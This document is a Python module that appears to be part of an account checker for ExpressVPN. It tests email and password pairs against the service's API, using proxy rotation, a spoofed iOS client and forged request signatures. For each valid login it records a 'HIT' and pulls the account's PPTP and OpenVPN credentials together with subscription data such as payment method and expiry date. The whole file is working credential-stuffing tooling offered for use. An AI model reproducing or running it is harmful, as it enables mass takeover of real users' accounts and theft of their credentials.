"""ExpressVPN API v2: login request + subscription lookup."""
import base64
import json
import time
from datetime import datetime

import requests

from .config import API_HOST, CLIENT_VER, USER_AGENT, CheckResult
from .crypto import aes_cbc_decrypt, envelope_encrypt, gzip_compress, hmac_b64, rand16, rand_digits


def _session(proxy: str | None) -> requests.Session:
    sess = requests.Session()
    sess.trust_env = False
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    return sess


def _fail(email: str, password: str, msg: str) -> CheckResult:
    return CheckResult(status="FAIL", email=email, password=password, msg=msg[:200])


def _login(sess: requests.Session, email: str, password: str,
           install_id: str, iv: bytes, key: bytes, timeout: int) -> dict:
    payload = json.dumps({
        "email": email,
        "iv": base64.b64encode(iv).decode(),
        "key": base64.b64encode(key).decode(),
        "password": password,
    }).encode()
    enc = envelope_encrypt(gzip_compress(payload))

    hdr_raw = (f"POST /apis/v2/credentials?client_version={CLIENT_VER}"
               f"&installation_id={install_id}&os_name=ios&os_version=14.4")
    headers = {
        "User-Agent": USER_AGENT,
        "Content-Type": "application/octet-stream",
        "X-Body-Compression": "gzip",
        "X-Signature": f"2 {hmac_b64(hdr_raw.encode())} 91c776e",
        "X-Body-Signature": f"2 {hmac_b64(enc)} 91c776e",
        "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
    }
    url = f"{API_HOST}/apis/v2/credentials?client_version={CLIENT_VER}&installation_id={install_id}&os_name=ios&os_version=14.4"
    resp = sess.post(url, data=enc, headers=headers, timeout=timeout)
    if resp.status_code != 200:
        raise RuntimeError(f"http {resp.status_code}")
    if len(resp.content) < 32:
        try:
            j = json.loads(resp.content.decode(errors="ignore"))
            raise RuntimeError(j.get("message") or j.get("error") or "bad login")
        except (ValueError, AttributeError):
            raise RuntimeError(resp.content.decode(errors="ignore").strip() or "bad login")
    return json.loads(aes_cbc_decrypt(resp.content, key, iv).decode())


def _subscription(sess: requests.Session, res: CheckResult, token: str, install_id: str, timeout: int) -> None:
    sub_raw = (f"GET /apis/v2/subscription?access_token={token}&client_version={CLIENT_VER}"
               f"&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email")
    batch_raw = (f"POST /apis/v2/batch?client_version={CLIENT_VER}"
                 f"&installation_id={install_id}&os_name=ios&os_version=14.4")
    cap = json.dumps([{
        "headers": {"Accept-Language": "en",
                    "X-Signature": f"2 {hmac_b64(sub_raw.encode())} 91c776e"},
        "method": "GET",
        "url": (f"/apis/v2/subscription?access_token={token}&client_version={CLIENT_VER}"
                f"&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"),
    }])
    headers = {
        "User-Agent": USER_AGENT, "Content-Type": "application/json",
        "X-Body-Compression": "gzip", "Accept-Language": "en",
        "Accept-Encoding": "gzip, deflate",
        "X-Signature": f"2 {hmac_b64(batch_raw.encode())} 91c776e",
        "X-Body-Signature": f"2 {hmac_b64(cap.encode())} 91c776e",
    }
    resp = sess.post(
        f"{API_HOST}/apis/v2/batch?client_version={CLIENT_VER}"
        f"&installation_id={install_id}&os_name=ios&os_version=14.4",
        data=cap, headers=headers, timeout=timeout)
    rows = json.loads(resp.content.decode(errors="ignore"))
    sub = json.loads(rows[0]["body"])["subscription"]
    res.plan = str(sub.get("billing_cycle", "-"))
    res.renew = str(sub.get("auto_bill", "-"))
    res.pay = str(sub.get("payment_method", "-"))
    exp = str(sub.get("expiration_time", ""))
    if exp and exp != "-":
        ts = int(float(exp))
        res.expire = datetime.fromtimestamp(ts).strftime("%Y-%m-%d")
        days = (ts - int(time.time())) // 86400
        res.days = str(days)
        if days < 0:
            res.status = "FAIL"
            res.msg = f"expired ({-days} days ago)"


def check_one(email: str, password: str, proxy: str | None = None, timeout: int = 20) -> CheckResult:
    sess = _session(proxy)
    install_id = rand_digits(64)
    iv, key = rand16(), rand16()
    try:
        login = _login(sess, email, password, install_id, iv, key, timeout)
    except Exception as e:
        return _fail(email, password, str(e))
    res = CheckResult(
        status="HIT", email=email, password=password, msg="ok",
        pptp=f"{login.get('pptp_username', '-')}:{login.get('pptp_password', '-')}",
        ovpn=f"{login.get('ovpn_username', '-')}:{login.get('ovpn_password', '-')}",
    )
    token = login.get("access_token", "")
    if not token:
        return res
    try:
        _subscription(sess, res, token, install_id, timeout)
    except Exception:
        pass
    return res
